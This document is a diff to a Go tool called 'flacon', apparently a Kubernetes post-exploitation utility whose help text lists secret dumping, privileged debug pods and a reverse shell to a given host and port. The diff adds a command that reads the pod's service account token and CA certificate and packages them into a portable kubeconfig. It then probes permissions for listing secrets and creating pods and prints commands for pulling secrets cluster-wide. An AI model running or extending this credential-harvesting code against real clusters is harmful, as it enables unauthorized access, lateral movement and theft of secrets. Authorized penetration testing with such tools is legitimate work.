@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"context"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -21,6 +22,7 @@ import (
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/client-go/kubernetes"
 	"k8s.io/client-go/rest"
+	"k8s.io/client-go/tools/clientcmd"
 
 	"github.com/a1ex-var1amov/flacon/version"
 )
@@ -72,6 +74,14 @@ func main() {
 				return
 			}
 			establishReverseShell(os.Args[2])
+			return
+		case "kubeconfig", "--kubeconfig":
+			// Create kubeconfig from discovered credentials
+			outputPath := "flacon-kubeconfig.yaml"
+			if len(os.Args) >= 3 {
+				outputPath = os.Args[2]
+			}
+			createKubeconfig(outputPath)
 			return
 		}
 	}
@@ -200,6 +210,7 @@ Commands:
   dump-secrets, --dump-secrets  Dump secrets from all accessible namespaces
   debug-pod, --debug-pod   Create a privileged debug pod
   reverse-shell, --reverse-shell <host:port>  Establish reverse shell connection
+  kubeconfig, --kubeconfig [output_path]  Create kubeconfig from discovered credentials
   (no args)                Run full Kubernetes reconnaissance
 
 Examples:
@@ -208,6 +219,7 @@ Examples:
   flacon dump-secrets      Dump all secrets from all namespaces
   flacon debug-pod         Create a privileged debug pod
   flacon reverse-shell 192.168.1.100:4444  Connect to reverse shell listener
+  flacon kubeconfig        Create a kubeconfig file
   flacon version           Show version information
   flacon --help            Show help message
 
@@ -856,4 +868,200 @@ func executeCommand(conn net.Conn, command string) {
 
 	// Send response back
 	conn.Write([]byte(response))
+}
+
+func createKubeconfig(outputPath string) {
+	fmt.Println("🔧 Creating kubeconfig from discovered credentials...")
+	fmt.Println("📋 Version:", version.String())
+
+	// Try to get in-cluster config first
+	config, err := rest.InClusterConfig()
+	if err != nil {
+		fmt.Printf("❌ Failed to get in-cluster config: %v\n", err)
+		fmt.Println("   This command requires running inside a Kubernetes cluster")
+		return
+	}
+
+	// Get current namespace
+	namespace := os.Getenv("POD_NAMESPACE")
+	if namespace == "" {
+		if nsBytes, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
+			namespace = strings.TrimSpace(string(nsBytes))
+		} else {
+			namespace = "default"
+		}
+	}
+
+	fmt.Printf("📍 Current namespace: %s\n", namespace)
+
+	// Read service account token
+	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
+	tokenBytes, err := ioutil.ReadFile(tokenPath)
+	if err != nil {
+		fmt.Printf("❌ Failed to read service account token: %v\n", err)
+		return
+	}
+	token := strings.TrimSpace(string(tokenBytes))
+
+	// Read CA certificate
+	caPath := "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+	caBytes, err := ioutil.ReadFile(caPath)
+	if err != nil {
+		fmt.Printf("❌ Failed to read CA certificate: %v\n", err)
+		return
+	}
+
+	// Get cluster info (we'll use config directly for cluster host)
+
+	// Try to get cluster info from config
+	clusterHost := config.Host
+	if clusterHost == "" {
+		clusterHost = "https://kubernetes.default.svc.cluster.local"
+	}
+
+	fmt.Printf("🌐 Cluster host: %s\n", clusterHost)
+
+	// Create kubeconfig structure
+	kubeconfig := map[string]interface{}{
+		"apiVersion": "v1",
+		"kind":       "Config",
+		"clusters": []map[string]interface{}{
+			{
+				"name": "flacon-cluster",
+				"cluster": map[string]interface{}{
+					"server":                     clusterHost,
+					"certificate-authority-data": base64.StdEncoding.EncodeToString(caBytes),
+				},
+			},
+		},
+		"users": []map[string]interface{}{
+			{
+				"name": "flacon-user",
+				"user": map[string]interface{}{
+					"token": token,
+				},
+			},
+		},
+		"contexts": []map[string]interface{}{
+			{
+				"name": "flacon-context",
+				"context": map[string]interface{}{
+					"cluster":   "flacon-cluster",
+					"user":      "flacon-user",
+					"namespace": namespace,
+				},
+			},
+		},
+		"current-context": "flacon-context",
+	}
+
+	// Convert to YAML
+	yamlData, err := yaml.Marshal(kubeconfig)
+	if err != nil {
+		fmt.Printf("❌ Failed to marshal kubeconfig to YAML: %v\n", err)
+		return
+	}
+
+	// Write to file
+	err = ioutil.WriteFile(outputPath, yamlData, 0600)
+	if err != nil {
+		fmt.Printf("❌ Failed to write kubeconfig file: %v\n", err)
+		return
+	}
+
+	fmt.Printf("✅ Kubeconfig created successfully: %s\n", outputPath)
+	fmt.Printf("   File permissions: 600 (read/write for owner only)\n")
+
+	// Test the kubeconfig
+	fmt.Println("🧪 Testing kubeconfig...")
+
+	// Load the kubeconfig
+	clientConfig, err := clientcmd.NewClientConfigFromBytes(yamlData)
+	if err != nil {
+		fmt.Printf("❌ Failed to load kubeconfig: %v\n", err)
+		return
+	}
+
+	// Get rest config
+	restConfig, err := clientConfig.ClientConfig()
+	if err != nil {
+		fmt.Printf("❌ Failed to get rest config: %v\n", err)
+		return
+	}
+
+	// Test connection
+	testClient, err := kubernetes.NewForConfig(restConfig)
+	if err != nil {
+		fmt.Printf("❌ Failed to create test client: %v\n", err)
+		return
+	}
+
+	// Try to list namespaces
+	namespaces, err := testClient.CoreV1().Namespaces().List(context.TODO(), metav1.ListOptions{})
+	if err != nil {
+		fmt.Printf("❌ Failed to test connection: %v\n", err)
+		return
+	}
+
+	fmt.Printf("✅ Kubeconfig test successful! Found %d namespaces\n", len(namespaces.Items))
+
+	// Show usage instructions
+	fmt.Println("\n📖 Usage instructions:")
+	fmt.Printf("   export KUBECONFIG=%s\n", outputPath)
+	fmt.Printf("   kubectl get namespaces\n")
+	fmt.Printf("   kubectl get pods --all-namespaces\n")
+	fmt.Printf("   kubectl get secrets --all-namespaces\n")
+
+	// Show current permissions
+	fmt.Println("\n🔐 Current permissions:")
+
+	// Test common operations
+	operations := []struct {
+		name string
+		test func() error
+	}{
+		{"List pods", func() error {
+			_, err := testClient.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
+			return err
+		}},
+		{"List secrets", func() error {
+			_, err := testClient.CoreV1().Secrets(namespace).List(context.TODO(), metav1.ListOptions{})
+			return err
+		}},
+		{"List services", func() error {
+			_, err := testClient.CoreV1().Services(namespace).List(context.TODO(), metav1.ListOptions{})
+			return err
+		}},
+		{"Create pod (dry-run)", func() error {
+			dummyPod := &corev1.Pod{
+				TypeMeta: metav1.TypeMeta{
+					Kind:       "Pod",
+					APIVersion: "v1",
+				},
+				ObjectMeta: metav1.ObjectMeta{
+					Name:      "test-pod",
+					Namespace: namespace,
+				},
+				Spec: corev1.PodSpec{
+					Containers: []corev1.Container{
+						{
+							Name:  "test",
+							Image: "busybox:latest",
+						},
+					},
+					RestartPolicy: corev1.RestartPolicyNever,
+				},
+			}
+			_, err := testClient.CoreV1().Pods(namespace).Create(context.TODO(), dummyPod, metav1.CreateOptions{DryRun: []string{"All"}})
+			return err
+		}},
+	}
+
+	for _, op := range operations {
+		if err := op.test(); err != nil {
+			fmt.Printf("   ❌ %s: %v\n", op.name, err)
+		} else {
+			fmt.Printf("   ✅ %s\n", op.name)
+		}
+	}
 }
